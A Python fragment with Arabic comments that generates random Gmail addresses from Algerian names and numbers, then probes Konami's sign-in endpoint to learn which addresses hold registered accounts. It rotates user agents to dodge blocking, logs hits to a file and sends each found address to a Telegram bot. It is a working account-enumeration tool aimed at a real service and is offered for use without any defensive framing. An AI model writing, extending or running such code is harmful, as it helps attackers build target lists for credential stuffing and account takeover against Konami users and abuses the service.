class ComboGenerator:
    """ محرك توليد الإيميلات الذكي بناءً على الأسماء والأرقام """
    def __init__(self):
        self.names = ALGERIAN_NAMES

    def generate_random_email(self):
        name = random.choice(self.names)
        # توليد رقم عشوائي (2 أو 3 أو 4 أرقام كما طلبت)
        num_len = random.choice([2, 3, 4])
        if num_len == 2:
            num = random.randint(10, 99)
        elif num_len == 3:
            num = random.randint(100, 999)
        else:
            num = random.randint(1000, 9999)
        
        # تنسيقات مختلفة للإيميلات لزيادة التنوع
        formats = [
            f"{name}{num}@gmail.com",
            f"{name}.{num}@gmail.com",
            f"{name}_{num}@gmail.com",
            f"{name}{num}{name}@gmail.com"
        ]
        return random.choice(formats)

class KonamiChecker:
    """ محرك الفحص في موقع كونامي مع نظام حماية من الحظر """
    def __init__(self, token, chat_id):
        self.url = "https://my.konami.net/auth/authorize.html" # نقطة فحص الإيميل
        self.token = token
        self.chat_id = chat_id

    def check_email(self, email):
        global TOTAL_SCANNED, BAN_DETECTED
        if BAN_DETECTED:
            return

        ua = random.choice(USER_AGENTS)
        headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "ar,en-US;q=0.7,en;q=0.3",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://my.konami.net",
            "Connection": "keep-alive",
            "Referer": "https://my.konami.net/en_GB/signin"
        }

        # محاكاة طلب التحقق من الإيميل في كونامي
        # ملاحظة: سنستخدم هنا البرامترات التي يطلبها موقع كونامي لإظهار وجود الحساب
        payload = {
            "userId": email,
            "login_type": "1", # محاكاة نوع الدخول
            "region": "AF", # كود المنطقة (أفريقيا/الجزائر)
            "language": "en"
        }

        try:
            # إرسال طلب الفحص
            response = requests.post(self.url, data=payload, headers=headers, timeout=15)
            
            # إذا كان الرد يحوي كود الحظر (مثل 403 أو 429)
            if response.status_code == 429 or "Too Many Requests" in response.text:
                print(f"\n{R} [!] IP BANNED! STOPPING SYSTEM TO PREVENT DAMAGE...{RESET}")
                BAN_DETECTED = True
                return

            # المنطق البرمجي لاكتشاف الإيميل المسجل
            # غالباً كونامي ترد برسالة "هذا الإيميل مسجل" أو تعطي كود خطأ معين للباسورد
            if "Incorrect password" in response.text or "password" in response.text.lower():
                self.save_and_report(email, "REGISTERED")
            elif "not registered" in response.text.lower():
                pass # غير مسجل
            
            TOTAL_SCANNED += 1
            sys.stdout.write(f"\r {W}[SCANNING] {TOTAL_SCANNED} | {G}FOUND:{len(FOUND_EMAILS)} | {Y}UA:{ua[:20]}...{RESET}")
            sys.stdout.flush()

        except Exception as e:
            # في حالة انقطاع الاتصال أو مشكلة في الشبكة
            pass

    def save_and_report(self, email, status):
        global FOUND_EMAILS
        if email not in FOUND_EMAILS:
            FOUND_EMAILS.append(email)
            print(f"\n{G} [KONAMI-HIT] {email} {RESET}")
            with open("KONAMI_PES_FOUND.txt", "a") as f:
                f.write(f"{email}\n")
            
            # إرسال تنبيه للتيليجرام
            msg = f"⚽️ KONAMI ACCOUNT FOUND!\n\nEmail: {email}\nStatus: Registered"
            self.telegram_send(msg)

    def telegram_send(self, msg):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        data = {"chat_id": self.chat_id, "text": msg}
        try: requests.post(url, data=data)
        except: pass

